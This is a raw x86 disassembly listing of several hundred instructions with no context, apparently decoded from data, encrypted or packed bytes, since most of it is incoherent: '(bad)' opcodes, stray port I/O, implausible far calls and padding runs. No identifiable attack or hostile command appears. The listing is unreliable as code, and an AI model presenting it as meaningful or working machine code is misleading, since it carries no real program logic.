  402270:	rol    BYTE PTR [eax],0x54
  402273:	in     al,0x2a
  402275:	add    eax,0x808923c5
  40227a:	sar    DWORD PTR [eax-0x79],0x98
  40227e:	cvtdq2ps xmm1,xmm3
  402281:	dec    esi
  402282:	sub    al,0xf2
  402284:	dec    eax
  402285:	add    DWORD PTR [eax],ebx
  402287:	mov    al,0xbe
  402289:	stc    
  40228a:	int3   
  40228b:	inc    eax
  40228c:	or     edi,DWORD PTR [ecx-0x8123dc]
  402292:	(bad)  
  402293:	(bad)  
  402294:	out    dx,eax
  402295:	dec    eax
  402296:	repz ret 
  402298:	or     DWORD PTR [ebp+0xe],ebx
  40229b:	pop    es
  40229c:	or     DWORD PTR [ecx-0x9149af],edi
  4022a2:	(bad)  
  4022a3:	jmp    DWORD PTR [ebp-0x857fe9]
  4022a9:	jg     0x40230d
  4022ab:	sub    eax,0x3c9e9551
  4022b0:	xchg   ecx,eax
  4022b1:	mov    al,ds:0xc8a739f4
  4022b6:	rcl    DWORD PTR [ecx+0x1],0x48
  4022ba:	push   esp
  4022bb:	mov    DWORD PTR [edx+0x1004876],ecx
  4022c1:	dec    eax
  4022c2:	jbe    0x402255
  4022c4:	xchg   edx,eax
  4022c5:	push   esp
  4022c6:	dec    eax
  4022c7:	add    BYTE PTR [ecx],al
  4022c9:	dec    eax
  4022ca:	push   esp
  4022cb:	cdq    
  4022cc:	call   0x7048:0x1004870
  4022d3:	mov    eax,ds:0x4834a2
  4022d8:	add    DWORD PTR [eax+0x34],ecx
  4022db:	test   eax,0x4870aa
  4022e0:	add    DWORD PTR [eax+0x70],ecx
  4022e3:	mov    cl,0xb2
  4022e5:	xor    al,0x48
  4022e7:	add    BYTE PTR [ecx],al
  4022e9:	dec    eax
  4022ea:	xor    al,0xb9
  4022ec:	mov    WORD PTR [ebp-0x255d3cef],?
  4022f2:	mov    esp,0x91094dc7
  4022f7:	mov    al,bh
  4022f9:	adc    dh,BYTE PTR [eax+eax*1-0x74]
  4022fd:	jge    0x402353
  4022ff:	mov    al,BYTE PTR [ebp+0x42207b21]
  402305:	(bad)  
  402306:	je     0x402307
  402308:	add    DWORD PTR [ecx+0x3b],esp
  40230b:	mov    BYTE PTR [eax-0x6b],ah
  40230e:	pop    ebp
  40230f:	mov    edx,DWORD PTR [edx-0x49]
  402312:	and    BYTE PTR [ebx-0x7724cf40],dh
  402318:	add    DWORD PTR [eax],edi
  40231a:	inc    ebp
  40231b:	mov    ecx,DWORD PTR ds:0xa9af3b00
  402321:	adc    ebx,DWORD PTR [ecx+0x5c]
  402324:	fsub   QWORD PTR [ecx-0x34b20e4d]
  40232a:	clc    
  40232b:	mov    eax,DWORD PTR [ecx]
  40232d:	dec    eax
  40232e:	mov    cl,0xac
  402330:	popa   
  402331:	test   eax,0x8776f8c3
  402336:	popf   
  402337:	and    BYTE PTR ds:0xc6e90cbd,al
  40233d:	sbb    BYTE PTR [eax],al
  40233f:	add    BYTE PTR [ecx],al
  402341:	mov    ebp,DWORD PTR [eax-0x73]
  402344:	jle    0x40235e
  402346:	mov    eax,DWORD PTR [eax]
  402348:	or     eax,0xa9ae3b00
  40234d:	adc    ecx,DWORD PTR [ebp+0x4102b500]
  402353:	add    eax,0x4004cedc
  402358:	or     al,0x2e
  40235a:	stos   DWORD PTR es:[edi],eax
  40235b:	sub    bh,BYTE PTR [eax-0x6f0c5a9c]
  402361:	inc    eax
  402362:	sub    al,0x79
  402364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402365:	dec    esp
  402366:	shl    DWORD PTR [ebx-0x33],0x83
  40236a:	pusha  
  40236b:	ret    
  40236c:	imul   esp,DWORD PTR [eax+eax*1],0xd2310120
  402373:	add    ch,BYTE PTR [ebx-0x64]
  402376:	cmp    edi,edi
  402378:	test   eax,0x8dd8e114
  40237d:	fsub   st,st(3)
  40237f:	add    BYTE PTR [eax+0x74],ah
  402382:	pop    ss
  402383:	jo     0x4023be
  402385:	inc    edi
  402386:	retf   
  402387:	or     BYTE PTR [eax+0x11cc3c0],dh
  40238d:	rol    BYTE PTR ds:0x4684b54b,0x54
  402394:	add    BYTE PTR [ecx-0x6a41b3ac],bh
  40239a:	mov    dh,BYTE PTR [esi-0x626a754f]
  4023a0:	call   0x4d24:0x351db91
  4023a7:	cmc    
  4023a8:	push   ecx
  4023a9:	xchg   ebp,eax
  4023aa:	popa   
  4023ab:	ret    
  4023ac:	mov    ds:0xf25449ea,al
  4023b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023b2:	sbb    cl,BYTE PTR [edx-0x33861654]
  4023b8:	and    al,0x0
  4023ba:	xchg   dh,al
  4023bc:	std    
  4023bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023be:	mov    ebx,DWORD PTR [eax+esi*2]
  4023c1:	add    DWORD PTR ds:0x6130d425,ebp
  4023c7:	xchg   BYTE PTR [esp+edx*1+0x50],al
  4023cb:	add    cl,dh
  4023cd:	sub    DWORD PTR [esi],esp
  4023cf:	jp     0x402390
  4023d1:	push   edx
  4023d2:	cmp    al,0x46
  4023d4:	jmp    0x14424c4
  4023d9:	pop    edx
  4023da:	call   0x723c17f7
  4023df:	enter  0x5ef4,0xa0
  4023e3:	jbe    0x402460
  4023e5:	pop    ebx
  4023e6:	add    BYTE PTR [edi+0x58],ah
  4023e9:	or     BYTE PTR [edi+0x26],bl
  4023ec:	gs add al,bh
  4023ef:	retf   0x88bc
  4023f2:	icebp  
  4023f3:	sbb    eax,0xb63e6540
  4023f8:	cdq    
  4023f9:	cwde   
  4023fa:	dec    ebx
  4023fb:	out    0xed,al
  4023fd:	popa   
  4023fe:	dec    edx
  4023ff:	cmp    esp,DWORD PTR [ebp+0x16f8a81]
  402405:	push   0x741bab60
  40240a:	or     BYTE PTR cs:0x12040743,cl
  402411:	daa    
  402412:	xchg   edx,eax
  402413:	cmp    eax,0x16947a50
  402418:	jl     0x4023ae
  40241a:	jp     0x40246d
  40241c:	push   esp
  40241d:	jp     0x4023b3
  40241f:	jl     0x40245b
  402421:	stos   BYTE PTR es:[edi],al
  402422:	test   DWORD PTR [eax+0x2],ebp
  402425:	outs   dx,BYTE PTR ds:[esi]
  402426:	push   ds
  402427:	sub    ecx,DWORD PTR [edi]
  402429:	adc    bl,BYTE PTR [ecx]
  40242b:	sbb    DWORD PTR [ebx],eax
  40242d:	and    esi,DWORD PTR [esi]
  40242f:	xchg   edi,eax
  402430:	test   eax,0xc9b6d758
  402435:	or     al,bh
  402437:	add    eax,0x66cb9a05
  40243c:	bound  edx,QWORD PTR [esi]
  40243e:	xchg   ebp,eax
  40243f:	add    DWORD PTR [eax-0x59],ebx
  402442:	push   es
  402443:	push   ebx
  402444:	add    eax,0xbf5a5f3a
  402449:	and    DWORD PTR [edx+0x50],ebp
  40244c:	add    DWORD PTR [ebx-0x45933e6],ecx
  402452:	cdq    
  402453:	add    BYTE PTR [ecx],al
  402455:	adc    ch,BYTE PTR [ebp-0x5b66a27a]
  40245b:	inc    edi
  40245c:	retf   
  40245d:	bound  ebx,QWORD PTR [eax-0x2c]
  402460:	repnz push edx
  402462:	jbe    0x402447
  402464:	ret    
  402465:	call   0x1b4f2bc
  40246a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40246b:	call   FWORD PTR [eax-0x59]
  40246e:	sub    DWORD PTR [edi],eax
  402470:	leave  
  402471:	loop   0x40240e
  402473:	push   esp
  402474:	pop    eax
  402475:	adc    dh,BYTE PTR [esp+eiz*8]
  402478:	ja     0x4024cf
  40247a:	sar    bh,1
  40247c:	pop    esi
  40247d:	lea    eax,[ebp-0x12]
  402480:	hlt    
  402481:	test   DWORD PTR [ecx-0x2fdf332c],ecx
  402487:	ficomp WORD PTR [eax+edx*1+0x24]
  40248b:	inc    esp
  40248c:	add    DWORD PTR [eax],eax
  40248e:	add    BYTE PTR [eax+0x69],ch
  402491:	add    BYTE PTR [eax],al
  402493:	add    ah,al
  402495:	xor    si,si
  402498:	xchg   ecx,eax
  402499:	mov    DWORD PTR [ebx],ebp
  40249b:	cdq    
  40249c:	cmp    eax,0xe255dce0
  4024a1:	adc    ah,BYTE PTR [ebp+0x640a6ee7]
  4024a7:	rol    BYTE PTR [ecx],1
  4024a9:	sti    
  4024aa:	out    dx,eax
  4024ab:	arpl   dx,dx
  4024ad:	adc    ebp,DWORD PTR [edi-0x1]
  4024b0:	mov    DWORD PTR [ebp+0x75],esi
  4024b3:	sub    BYTE PTR [ebp-0x13],cl
  4024b6:	dec    ebx
  4024b7:	and    eax,0x24523716
  4024bc:	jns    0x402457
  4024be:	jmp    0x402536
  4024c0:	loop   0x4024d5
  4024c2:	dec    ebp
  4024c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024c4:	xchg   ecx,eax
  4024c5:	sar    DWORD PTR [ecx+edx*4+0x554b0b6d],cl
  4024cc:	jno    0x402548
  4024ce:	sub    esp,ebx
  4024d0:	ret    
  4024d1:	sub    eax,DWORD PTR [ecx]
  4024d3:	mov    dh,0x21
  4024d5:	call   FWORD PTR [ecx-0x6bdbb010]
  4024db:	mov    BYTE PTR [edi+0x0],ch
  4024de:	jge    0x40247b
  4024e0:	adc    DWORD PTR [eax],eax
  4024e2:	aas    
  4024e3:	outs   dx,BYTE PTR ds:[esi]
  4024e4:	imul   ebp,DWORD PTR [eax-0x5a63efab],0x7e
  4024eb:	in     al,dx
  4024ec:	jmp    0x8ccc1571
  4024f1:	cld    
  4024f2:	imul   eax,DWORD PTR [eax],0xdcfc6806
  4024f8:	add    edi,edi
  4024fa:	push   ebp
  4024fb:	and    DWORD PTR [ebx+0x55],ecx
  4024fe:	xchg   edi,eax
  4024ff:	rol    DWORD PTR [ecx+0x6e000068],cl
  402505:	push   0x0
  402507:	push   0x68
  402509:	push   0x8001036a
  40250e:	aas    
  40250f:	(bad)  
  402510:	test   eax,0xc1c40173
  402515:	and    BYTE PTR [edx*2-0x4a66f3c],0x2e
  40251d:	mov    ds:0x5ec06144,eax
  402522:	(bad)  
  402523:	aam    0x4a
  402525:	jno    0x402559
  402527:	into   
  402528:	bound  esp,QWORD PTR [ebp+0x76]
  40252b:	aam    0x1e
  40252d:	sbb    edx,DWORD PTR [ecx-0x7c]
  402530:	sub    ebp,DWORD PTR [ebp+0x52]
  402533:	pop    edi
  402534:	lds    edx,FWORD PTR [edx+0x27b3bc5d]
  40253a:	dec    esi
  40253b:	xchg   DWORD PTR [ecx+0x6e],ecx
  40253e:	mov    eax,0xadfbd425
  402543:	jns    0x4024fa
  402545:	xchg   ebx,eax
  402546:	adc    DWORD PTR [esi],esi
  402548:	sub    al,0x8f
  40254a:	xchg   edx,eax
  40254b:	lea    esi,[eax-0x5c713a9c]
  402551:	cmp    ch,dh
  402553:	aas    
  402554:	adc    al,0xa6
  402556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402558:	lea    esp,[edi-0x3ad51cf8]
  40255e:	add    al,0xd7
  402560:	jnp    0x40251f
  402562:	push   ds
  402563:	clc    
  402564:	xchg   DWORD PTR [ebx+0x12602],edx
  40256a:	add    BYTE PTR [edi+0x1],dh
  402570:	add    DWORD PTR [eax],eax
  402572:	add    BYTE PTR [eax],al
  402574:	add    DWORD PTR [eax],eax
  402576:	add    BYTE PTR [eax],al
  402578:	add    DWORD PTR [eax],eax
  40257a:	add    BYTE PTR [eax],al
  40257c:	add    DWORD PTR [eax],eax
  40257e:	add    BYTE PTR [eax],al
  402580:	add    DWORD PTR [edx+0x72],ebp
  402583:	add    BYTE PTR [ecx],al
  402585:	jb     0x4025d1
  402587:	add    eax,0x42004
  40258c:	add    DWORD PTR [edi+0x7b27347b],eax
  402592:	add    DWORD PTR [eax],0xffffffc6
  402595:	mul    BYTE PTR [esi-0x2f]
  402598:	mov    eax,0x45963822
  40259d:	test   BYTE PTR ds:[ecx],al
  4025a0:	xchg   ebx,eax
  4025a1:	pop    edi
  4025a2:	sbb    eax,0x39ac8de9
  4025a7:	pop    eax
  4025a8:	shl    esi,1
  4025aa:	pop    ecx
  4025ab:	mov    ebp,0xadd62c6d
  4025b0:	ins    DWORD PTR es:[edi],dx
  4025b1:	jae    0x40258f
  4025b3:	out    0x6b,al
  4025b5:	.byte 0x15
  4025b6:	mov    BYTE PTR [edi],cl
